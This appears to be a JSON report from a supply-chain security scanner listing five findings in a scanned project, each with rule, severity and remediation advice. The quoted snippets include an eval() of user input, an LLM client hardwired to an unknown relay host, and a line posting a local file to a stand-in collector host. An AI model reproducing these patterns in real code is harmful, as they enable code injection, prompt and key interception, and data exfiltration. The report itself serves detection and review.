@@ -1,0 +1,121 @@
+{
+  "files_scanned": 0,
+  "findings": [
+    {
+      "behavior": "install_time_execution",
+      "file": "package.json",
+      "fingerprint": "54febe951e9c9c7664486fec68824896",
+      "line": 4,
+      "phase": "install_hooks",
+      "references": [
+        "MITRE T1195.001",
+        "MITRE T1059.007"
+      ],
+      "remediation": "A preinstall or postinstall that is exactly node <script inside the package>, where that script and the local scripts it requires (two levels deep) are short, plain ASCII, load nothing but os, path, url, util and relative JSON, use process only for exit, argv, platform, arch, version, stdout, stderr and cwd, and use no network, filesystem, child-process, environment, eval, Function or reflection API. The install adds no dependency. Nothing in the install's scope may swap or add a package anywhere in the tree: no manifest in the scope or above it declares a non-empty overrides, resolutions, pnpm.overrides, pnpm.packageExtensions or pnpm.patchedDependencies, no pnpm-workspace.yaml or .yarnrc.yml declares overrides, packageExtensions or patches, and every lockfile there (package-lock.json, npm-shrinkwrap.json, yarn.lock, pnpm-lock.yaml) parses and resolves every entry to the public registry's tarball of that package (a bun lockfile always counts against it), because a dependency of a trusted tool is hoisted too and can link a bin under the tool's name. It still runs on every npm install, so it is Medium rather than Low: read the script, confirm it only checks the platform or prints a message, and re-read it whenever the package updates. Any change that adds a capability returns the finding to INSTALL-003 (Critical).",
+      "rule": "INSTALL-010",
+      "severity": "MEDIUM",
+      "snippet": "npm lifecycle script that only runs an inert local script: \"scripts\": { \"postinstall\": \"node setup.js\" } (postinstall: 1 script(s) checked; no capability beyond console output)",
+      "tags": [
+        "install-hook",
+        "npm",
+        "package-json",
+        "lifecycle-script"
+      ],
+      "title": "npm lifecycle script that only runs an inert local script",
+      "weight": 10
+    },
+    {
+      "behavior": "dynamic_execution",
+      "file": "src/app.js",
+      "fingerprint": "92f2b4fe7e61a6d3edaa7b744c6e48f8",
+      "line": 2,
+      "phase": "code_patterns",
+      "references": [
+        "CWE-95",
+        "MITRE T1059"
+      ],
+      "remediation": "eval() in Python, JavaScript, PHP or Ruby compiles and runs a string as code, so read the string it receives. A template engine, REPL or calculator evaluating input the package documents is a known shape; a string that is decoded (Base64, charCode), concatenated from fragments or fetched over the network was written so the executed code never appears as reviewable source, and that package should be rejected. Defining a function or method named eval (def eval(, function eval(, or a JavaScript class or object method `eval(x) {`) is not a call and is not reported; a call on the same line still is.",
+      "rule": "CODE-001",
+      "severity": "HIGH",
+      "snippet": "eval() call \u2014 arbitrary code execution: return eval(userInput);",
+      "tags": [
+        "execution",
+        "eval",
+        "dynamic-code"
+      ],
+      "title": "eval() call \u2014 arbitrary code execution",
+      "weight": 5
+    },
+    {
+      "behavior": "inference_tampering",
+      "file": "src/client.py",
+      "fingerprint": "7a23ed3993cdc7fbfb17e2c4b6b8055e",
+      "line": 2,
+      "phase": "inference_security",
+      "references": [
+        "MITRE T1557",
+        "CWE-300",
+        "CAPEC-94"
+      ],
+      "remediation": "Read the base_url passed to the OpenAI or Anthropic Python client. A value taken from configuration or an environment variable, or a documented endpoint (Azure, a local vLLM or Ollama server, a named gateway such as OpenRouter or LiteLLM), is normal; a hardcoded unfamiliar host receives every prompt, every completion and the API key in the auth header, so treat an unexplained literal URL as an endpoint hijack and reject the package.",
+      "rule": "INFER-001",
+      "severity": "HIGH",
+      "snippet": "Inference security \u2014 LLM client pointed at a hardcoded endpoint (potential endpoint hijack): client = OpenAI(base_url='https://relay.example.invalid/v1', api_key=KEY)",
+      "tags": [
+        "inference",
+        "endpoint-redirect",
+        "llm-client",
+        "python"
+      ],
+      "title": "Inference security \u2014 LLM client pointed at a hardcoded endpoint (potential endpoint hijack)",
+      "weight": 5
+    },
+    {
+      "behavior": "inference_tampering",
+      "file": "src/client.py",
+      "fingerprint": "40c7f05b8515847d5cb23e5b62e4659a",
+      "line": 2,
+      "phase": "inference_security",
+      "references": [
+        "MITRE T1557",
+        "CWE-300",
+        "CAPEC-94"
+      ],
+      "remediation": "A base URL literal in an LLM client config points at a host that is not a known model vendor, a local server or a named gateway. On its own that is only worth a look (a self-hosted or gateway endpoint is ordinary and should usually come from configuration, not a literal). It is reported so INFER-CHAIN-001 can pair it with a hardcoded client key in the same client config: a package that ships both is routing your prompts, and the key it sends, through an account and an endpoint you do not control.",
+      "rule": "INFER-012",
+      "severity": "LOW",
+      "snippet": "Inference security \u2014 LLM client baseURL points at a non-vendor host: client = OpenAI(base_url='https://relay.example.invalid/v1', api_key=KEY)",
+      "tags": [
+        "inference",
+        "endpoint-redirect",
+        "llm-client"
+      ],
+      "title": "Inference security \u2014 LLM client baseURL points at a non-vendor host",
+      "weight": 5
+    },
+    {
+      "behavior": "network_outbound",
+      "file": "src/net.py",
+      "fingerprint": "de1424ca8286ed9b0a9c8aeff8ad81b1",
+      "line": 2,
+      "phase": "network_exfil",
+      "references": [
+        "MITRE T1071.001"
+      ],
+      "remediation": "Confirm the destination is one the package documents. Outbound HTTP is normal in clients and abnormal in a formatter; the domain decides.",
+      "rule": "NET-001",
+      "severity": "LOW",
+      "snippet": "HTTP request via requests library: requests.post(\"https://collector.example.invalid/upload\", data=open(\"notes.txt\").read())",
+      "tags": [
+        "network"
+      ],
+      "title": "HTTP request via requests library",
+      "weight": 3
+    }
+  ],
+  "metadata": {
+    "source": "sigil-explain"
+  },
+  "target": "scan-new",
+  "target_type": "directory"
+}
